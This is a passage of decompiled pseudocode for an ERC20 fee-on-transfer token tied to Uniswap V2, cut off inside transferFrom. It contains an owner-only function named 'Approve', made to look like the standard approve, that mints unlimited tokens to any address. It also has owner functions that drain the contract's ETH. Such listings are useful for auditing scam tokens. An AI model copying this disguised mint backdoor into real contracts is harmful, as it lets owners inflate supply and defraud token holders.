contract main {




// =====================  Runtime code  =====================


const decimals = 6

const blackHole = 57005

const getNow = block.timestamp


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address uniswapV2RouterAddress;
address uniswapV2PairAddress;
uint256 _startTime;
uint256 swapTime;
address stor10;
mapping of uint8 stor12;
mapping of uint8 stor13;
uint8 swapAndLiquifyEnabled;

function name() {
    return name[0 len name.length]
}

function uniswapV2Router() {
    return uniswapV2RouterAddress
}

function totalSupply() {
    return totalSupply
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function swapAndLiquifyEnabled() {
    return bool(swapAndLiquifyEnabled)
}

function isExcludedFromFees(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor12[address(arg1)])
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function isAutomatedMarketMakerPair(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor13[address(arg1)])
}

function swapTime() {
    return swapTime
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function automatedMarketMakerPairs(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor13[arg1])
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _startTime() {
    return _startTime
}

function _fallback() payable {
    revert
}

function setStartTime() {
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    _startTime = block.timestamp
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function sub_fb3053c4(?) {
    if swapTime + _startTime < _startTime:
        revert with 0, 'SafeMath: addition overflow'
    return swapTime + _startTime >= block.timestamp
}

function setSwapAndLiquifyEnabled(bool arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    swapAndLiquifyEnabled = uint8(arg1)
}

function setAutomatedMarketMakerPair(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    stor13[address(arg1)] = uint8(arg2)
}

function excludeFromFees(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    stor12[address(arg1)] = uint8(arg2)
    emit ExcludeFromFees(arg2, arg1);
}

function updateUniswapV2Router(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    emit UpdateUniswapV2Router(arg1, uniswapV2RouterAddress);
    uniswapV2RouterAddress = arg1
}

function withdraw() {
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function clearStuckBalance(uint256 arg1, address arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    call arg2 with:
       value eth.balance(this.address) * arg1 / 100 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function rescueToken(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args msg.sender, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return bool(ext_call.return_data[0])
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function Approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    if not arg1:
        revert with 0, 'ERC20: mint to the zero address'
    if arg2 + totalSupply < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if arg2 + balanceOf[address(arg1)] < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, 0, arg1);
}

function excludeMultipleAccountsFromFees(address[] arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    idx = 0
    while idx < arg1.length:
        mem[0] = address(cd[((32 * idx) + arg1 + 36)])
        mem[32] = 12
        stor12[address(cd[((32 * idx) + arg1 + 36)])] = uint8(arg2)
        idx = idx + 1
        continue 
    emit ExcludeMultipleAccountsFromFees(Array(len=arg1.length, data=call.data[arg1 + 36 len floor32(arg1.length)]), arg2);
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 + allowance[address(msg.sender)][address(arg1)] < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((arg2 + allowance[address(msg.sender)][address(arg1)]), msg.sender, arg1);
    return 1
}

function sub_17e2003a(?) {
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    require ext_code.size(uniswapV2RouterAddress)
    staticcall uniswapV2RouterAddress.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not this.address:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not uniswapV2RouterAddress:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(this.address)][stor6] = balanceOf[address(this.address)]
    emit Approval(balanceOf[address(this.address)], this.address, uniswapV2RouterAddress);
    mem[388 len 0] = None
    require ext_code.size(uniswapV2RouterAddress)
    call uniswapV2RouterAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
         gas gas_remaining wei
        args balanceOf[address(this.address)], 0, 160, this.address, block.timestamp, 2, mem[388 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_84e63bb2(?) {
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    require ext_code.size(uniswapV2RouterAddress)
    staticcall uniswapV2RouterAddress.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not this.address:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not uniswapV2RouterAddress:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(this.address)][stor6] = balanceOf[address(this.address)]
    emit Approval(balanceOf[address(this.address)], this.address, uniswapV2RouterAddress);
    mem[388 len 0] = None
    require ext_code.size(uniswapV2RouterAddress)
    call uniswapV2RouterAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
         gas gas_remaining wei
        args balanceOf[address(this.address)], 0, 160, this.address, block.timestamp, 2, mem[388 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    call stor10 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
}

function sub_1f2eb32f(?) {
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    require ext_code.size(uniswapV2RouterAddress)
    staticcall uniswapV2RouterAddress.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not this.address:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not uniswapV2RouterAddress:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(this.address)][stor6] = balanceOf[address(this.address)]
    emit Approval(balanceOf[address(this.address)], this.address, uniswapV2RouterAddress);
    mem[388 len 0] = None
    require ext_code.size(uniswapV2RouterAddress)
    call uniswapV2RouterAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
         gas gas_remaining wei
        args balanceOf[address(this.address)], 0, 160, this.address, block.timestamp, 2, mem[388 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if uniswapV2PairAddress == arg1:
        if not _startTime:
            _startTime = block.timestamp
    if stor12[address(msg.sender)]:
        if arg2:
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[166 len 26],
                            mem[218 len 6]
            balanceOf[address(msg.sender)] -= arg2
            if arg2 + balanceOf[arg1] < balanceOf[arg1]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
            emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor12[address(arg1)]:
            if arg2:
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                37,
                                0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                                mem[201 len 27]
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                35,
                                0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                                mem[199 len 29]
                if arg2 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[166 len 26],
                                mem[218 len 6]
                balanceOf[address(msg.sender)] -= arg2
                if arg2 + balanceOf[arg1] < balanceOf[arg1]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
                emit Transfer(arg2, msg.sender, arg1);
        else:
            if not arg2:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not stor10:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                if 0 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[230 len 26],
                                mem[282 len 6]
                if balanceOf[stor10] < balanceOf[stor10]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor10] = balanceOf[stor10]
                emit Transfer(0, msg.sender, stor10);
            else:
                if 2 * arg2 / arg2 != 2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if not msg.sender:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not stor10:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                if 2 * arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[230 len 26],
                                mem[282 len 6]
                balanceOf[address(msg.sender)] -= 2 * arg2 / 100
                if (2 * arg2 / 100) + balanceOf[stor10] < balanceOf[stor10]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor10] += 2 * arg2 / 100
                emit Transfer((2 * arg2 / 100), msg.sender, stor10);
            if not arg2:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[425 len 27]
                if 0 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[390 len 26],
                                mem[442 len 6]
                if balanceOf[57005] < balanceOf[57005]:
                    revert with 0, 'SafeMath: addition overflow'
                emit Transfer(0, msg.sender, 57005);
            else:
                if 2 * arg2 / arg2 != 2:
                    revert with 0, 32, 33, 0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[357 len 31]
                if not msg.sender:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[425 len 27]
                if 2 * arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[390 len 26],
                                mem[442 len 6]
                balanceOf[address(msg.sender)] -= 2 * arg2 / 100
                if (2 * arg2 / 100) + balanceOf[57005] < balanceOf[57005]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[57005] += 2 * arg2 / 100
                emit Transfer((2 * arg2 / 100), msg.sender, 57005);
            if not arg2:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
                if not uniswapV2PairAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
                if 0 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[550 len 26],
                                mem[602 len 6]
                if balanceOf[stor7] < balanceOf[stor7]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor7] = balanceOf[stor7]
                emit Transfer(0, msg.sender, uniswapV2PairAddress);
            else:
                if 4 * arg2 / arg2 != 4:
                    revert with 0, 32, 33, 0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[517 len 31]
                if not msg.sender:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
                if not uniswapV2PairAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
                if 4 * arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[550 len 26],
                                mem[602 len 6]
                balanceOf[address(msg.sender)] -= 4 * arg2 / 100
                if (4 * arg2 / 100) + balanceOf[stor7] < balanceOf[stor7]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor7] += 4 * arg2 / 100
                emit Transfer((4 * arg2 / 100), msg.sender, uniswapV2PairAddress);
            if not arg2:
                if uniswapV2PairAddress == msg.sender:
                    if swapTime + _startTime < _startTime:
                        revert with 0, 'SafeMath: addition overflow'
                    if swapTime + _startTime >= block.timestamp:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                        if not uniswapV2PairAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                        if 0 > balanceOf[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[710 len 26],
                                        mem[762 len 6]
                        if balanceOf[stor7] < balanceOf[stor7]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[stor7] = balanceOf[stor7]
                        emit Transfer(0, msg.sender, uniswapV2PairAddress);
            else:
                if 92 * arg2 / arg2 != 92:
                    revert with 0, 32, 33, 0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[677 len 31]
                if uniswapV2PairAddress != msg.sender:
                    if 92 * arg2 / 100:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                        if not arg1:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                        if 92 * arg2 / 100 > balanceOf[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[710 len 26],
                                        mem[762 len 6]
                        balanceOf[address(msg.sender)] -= 92 * arg2 / 100
                        if (92 * arg2 / 100) + balanceOf[arg1] < balanceOf[arg1]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[address(arg1)] = (92 * arg2 / 100) + balanceOf[arg1]
                        emit Transfer((92 * arg2 / 100), msg.sender, arg1);
                else:
                    if swapTime + _startTime < _startTime:
                        revert with 0, 'SafeMath: addition overflow'
                    if swapTime + _startTime >= block.timestamp:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                        if not uniswapV2PairAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                        if 92 * arg2 / 100 > balanceOf[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[710 len 26],
                                        mem[762 len 6]
                        balanceOf[address(msg.sender)] -= 92 * arg2 / 100
                        if (92 * arg2 / 100) + balanceOf[stor7] < balanceOf[stor7]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[stor7] += 92 * arg2 / 100
                        emit Transfer((92 * arg2 / 100), msg.sender, uniswapV2PairAddress);
                    else:
                        if 92 * arg2 / 100:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                            if not arg1:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                            if 92 * arg2 / 100 > balanceOf[address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            38,
                                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                            mem[710 len 26],
                                            mem[762 len 6]
                            balanceOf[address(msg.sender)] -= 92 * arg2 / 100
                            if (92 * arg2 / 100) + balanceOf[arg1] < balanceOf[arg1]:
                                revert with 0, 'SafeMath: addition overflow'
                            balanceOf[address(arg1)] = (92 * arg2 / 100) + balanceOf[arg1]
                            emit Transfer((92 * arg2 / 100), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if uniswapV2PairAddress == arg2:
        if not _startTime:
            _startTime = block.timestamp
    if stor12[address(arg1)]:
        if not arg3:
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[168 len 24],
                            mem[216 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
        else:
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 
                            32,
                            38,
                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[166 len 26],
                            mem[218 len 6]
            balanceOf[address(arg1)] -= arg3
            if arg3 + balanceOf[arg2] < balanceOf[arg2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
            emit Transfer(arg3, arg1, arg2);
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[264 len 24],
                            mem[312 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    else:
        if stor12[address(arg2)]:
            if not arg3:
                if arg3 > allowance[address(arg1)][address(msg.sender)]:
                    revert with 0, 
                                32,
                                40,
                                0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                mem[168 len 24],
                                mem[216 len 8]
                if not arg1:
                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
                if not msg.sender:
                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
            else:
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                37,
                                0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                                mem[201 len 27]
                if not arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                35,
                                0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                                mem[199 len 29]
                if arg3 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[166 len 26],
                                mem[218 len 6]
                balanceOf[address(arg1)] -= arg3
                if arg3 + balanceOf[arg2] < balanceOf[arg2]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
                emit Transfer(arg3, arg1, arg2);
                if arg3 > allowance[address(arg1)][address(msg.sender)]:
                    revert with 0, 
                                32,
                                40,
                                0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                mem[264 len 24],
                                mem[312 len 8]
                if not arg1:
                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
                if not msg.sender:
                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
        else:
            if not arg3:
                if not arg1:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not stor10:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                if 0 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[230 len 26],
                                mem[282 len 6]
                if balanceOf[stor10] < balanceOf[stor10]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor10] = balanceOf[stor10]
                emit Transfer(0, arg1, stor10);
            else:
                if 2 * arg3 / arg3 != 2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if not arg1:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not stor10:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                if 2 * arg3 / 100 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[230 len 26],
                                mem[282 len 6]
                balanceOf[address(arg1)] -= 2 * arg3 / 100
                if (2 * arg3 / 100) + balanceOf[stor10] < balanceOf[stor10]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor10] += 2 * arg3 / 100
                emit Transfer((2 * arg3 / 100), arg1, stor10);
            if not arg3:
                if not arg1:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[425 len 27]
                if 0 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[390 len 26],
                                mem[442 len 6]
                if balanceOf[57005] < balanceOf[57005]:
                    revert with 0, 'SafeMath: addition overflow'
                emit Transfer(0, arg1, 57005);
            else:
                if 2 * arg3 / arg3 != 2:
                    revert with 0, 32, 33, 0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[357 len 31]
                if not arg1:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[425 len 27]
                if 2 * arg3 / 100 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[390 len 26],
                                mem[442 len 6]
                balanceOf[address(arg1)] -= 2 * arg3 / 100
                if (2 * arg3 / 100) + balanceOf[57005] < balanceOf[57005]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[57005] += 2 * arg3 / 100
                emit Transfer((2 * arg3 / 100), arg1, 57005);
            if not arg3:
                if not arg1:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
                if not uniswapV2PairAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
                if 0 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[550 len 26],
                                mem[602 len 6]
                if balanceOf[stor7] < balanceOf[stor7]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor7] = balanceOf[stor7]
